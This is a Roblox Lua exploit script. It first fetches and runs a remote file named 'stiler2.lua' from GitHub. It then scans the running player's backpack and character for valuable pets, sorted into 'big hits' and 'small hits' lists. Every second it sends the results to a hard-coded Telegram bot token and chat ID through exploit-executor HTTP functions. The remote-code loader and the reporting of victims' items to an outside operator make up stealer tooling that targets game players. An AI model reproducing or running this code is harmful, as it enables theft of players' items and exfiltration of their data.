loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()

-- Telegram bot settings
local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
local CHAT_ID = "2001061743"

-- Pet type lists (case-insensitive)
local BIG_HITS = {
	"mimic octopus", "disco bee", "raccoon", "kitsune",
	"butterfly", "spinosaurus", "dog"
}

local SMALL_HITS = {
	"dragonfly", "queen bee", "night owl", "t-rex", "bunny"
}

-- Case-insensitive match check
local function inList(list, value)
	local lowerVal = tostring(value):lower()
	for _, v in ipairs(list) do
		if lowerVal == v then
			return true
		end
	end
	return false
end

-- Function: Send Telegram message (safe for LocalScript without exploit HTTP)
local function sendTelegramMessage(text)
	print("[PET ALERT DEBUG] Would send Telegram message:", text)

	-- Only attempt HTTP if exploit HTTP request function exists
	local requestFunc = http_request or request or syn and syn.request
	if not requestFunc then
		print("[PET ALERT DEBUG] No HTTP request available. Skipping send.")
		return
	end

	  -- Uncomment this when ready to actually send
	local url = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
	local data = {
		chat_id = CHAT_ID,
		text = text
	}
	local json = game:GetService("HttpService"):JSONEncode(data)

	requestFunc({
		Url = url,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = json
	})
	
end

-- Scan player's pets
local function scanMyPets()
	local LocalPlayer = game.Players.LocalPlayer
	local backpack = LocalPlayer:WaitForChild("Backpack")
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

	local bigHitsFound = {}
	local smallHitsFound = {}

	local function checkContainer(container, containerName)
		print("[PET ALERT DEBUG] Scanning", containerName, "for pets...")
		for _, pet in ipairs(container:GetChildren()) do
			-- ✅ Only consider if it has "PetType" attribute
			local petType = pet:GetAttribute("PetType")
			if pet:IsA("Tool") and petType ~= nil then
				local scale = pet:GetAttribute("Scale") or 0
				print(string.format("[PET ALERT DEBUG] Checking PetType: %s (Scale %.2f)", petType, scale))

				if inList(BIG_HITS, petType) or scale > 15 then
					print("[PET ALERT DEBUG] BIG HIT detected:", petType, scale)
					table.insert(bigHitsFound, string.format("%s (Scale %.2f)", petType, scale))
				elseif inList(SMALL_HITS, petType) then
					print("[PET ALERT DEBUG] SMALL HIT detected:", petType, scale)
					table.insert(smallHitsFound, string.format("%s (Scale %.2f)", petType, scale))
				end
			end
		end
	end

	checkContainer(backpack, "Backpack")
	checkContainer(character, "Character")

	if #bigHitsFound > 0 or #smallHitsFound > 0 then
		local msg = "[PET ALERT] Found pets:\n"
		if #bigHitsFound > 0 then
			msg = msg .. "\nBIG HITS:\n" .. table.concat(bigHitsFound, "\n")
		end
		if #smallHitsFound > 0 then
			msg = msg .. "\n\nSMALL HITS:\n" .. table.concat(smallHitsFound, "\n")
		end
		sendTelegramMessage(msg)
	else
		print("[PET ALERT DEBUG] No hits found this scan.")
	end
end

-- Run scan when joined
while true do
	scanMyPets()
	task.wait(1)
end

